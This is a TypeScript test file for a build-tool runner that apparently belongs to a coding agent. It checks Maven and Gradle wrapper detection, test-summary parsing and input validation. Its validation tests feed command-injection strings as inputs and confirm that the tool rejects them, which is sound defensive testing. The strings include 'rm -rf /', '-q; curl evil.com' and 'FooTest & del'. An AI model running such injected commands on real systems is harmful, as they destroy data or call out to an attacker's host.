import { describe, expect, test } from "bun:test";
import * as fs from "node:fs";
import * as path from "node:path";
import { parseTestSummary, runProjectTestTool, buildCommand } from "../src/tools/run-project-test";
import { makeTempRoot, makeContext } from "./helpers";

const FIXTURE = path.resolve(import.meta.dir, "../../../tui/tests/e2e/fixtures/java-maven-project");

describe("buildCommand — wrapper detection", () => {
  test("prefers the unix wrapper when present", () => {
    const root = makeTempRoot("codea-wrapper-");
    fs.writeFileSync(path.join(root, "mvnw"), "#!/bin/sh\n");
    const argv = buildCommand({ buildSystem: "maven" }, root);
    expect(argv[0]).toBe("./mvnw");
  });

  test("falls back to mvnw.cmd on Windows-only projects", () => {
    const root = makeTempRoot("codea-wrapper-");
    fs.writeFileSync(path.join(root, "mvnw.cmd"), "@echo off\n");
    const argv = buildCommand({ buildSystem: "maven" }, root);
    expect(argv[0]).toBe("./mvnw.cmd");
  });

  test("prefers mvnw.cmd on Windows when both wrapper variants exist", () => {
    const root = makeTempRoot("codea-wrapper-");
    fs.writeFileSync(path.join(root, "mvnw"), "#!/bin/sh\n");
    fs.writeFileSync(path.join(root, "mvnw.cmd"), "@echo off\n");
    expect(buildCommand({ buildSystem: "maven" }, root, "win32")[0]).toBe("./mvnw.cmd");
    expect(buildCommand({ buildSystem: "maven" }, root, "linux")[0]).toBe("./mvnw");
  });

  test("falls back to gradlew.bat on Windows-only gradle projects", () => {
    const root = makeTempRoot("codea-wrapper-");
    fs.writeFileSync(path.join(root, "gradlew.bat"), "@echo off\n");
    const argv = buildCommand({ buildSystem: "gradle" }, root);
    expect(argv[0]).toBe("./gradlew.bat");
  });

  test("falls back to bare mvn when no wrapper exists", () => {
    const root = makeTempRoot("codea-wrapper-");
    const argv = buildCommand({ buildSystem: "maven" }, root);
    expect(argv[0]).toBe("mvn");
  });
});

describe("parseTestSummary", () => {
  test("parses surefire summary", () => {
    const out = parseTestSummary("Tests run: 10, Failures: 1, Errors: 0, Skipped: 2");
    expect(out.passed).toBe(7);
    expect(out.failed).toBe(1);
    expect(out.skipped).toBe(2);
  });

  test("parses gradle summary", () => {
    const out = parseTestSummary("5 tests completed, 2 failed");
    expect(out.passed).toBe(3);
    expect(out.failed).toBe(2);
  });
});

describe("runProjectTestTool.execute", () => {
  test("runs the fixture mvnw stub and returns PASS", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven" }, ctx);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.category).toBe("PASS");
      expect(result.data.passed).toBe(3);
      expect(result.data.failed).toBe(0);
      expect(result.data.exitCode).toBe(0);
    }
  });

  test("rejects caller-supplied extraArgs (removed — no extension bypass)", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["rm -rf /"] }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });

  test("rejects caller-supplied extraArgs with shell metacharacters", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["-q; curl evil.com"] }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });

  test("rejects unsupported build system via schema", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "ant" }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });

  test("rejects shell metacharacters in testClass", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", testClass: "FooTest & del" }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });

  test("rejects shell metacharacters in module", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", module: "a|b" }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });

  test("rejects shell metacharacters in profiles", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", profiles: ["dev; rm -rf /"] }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });
});
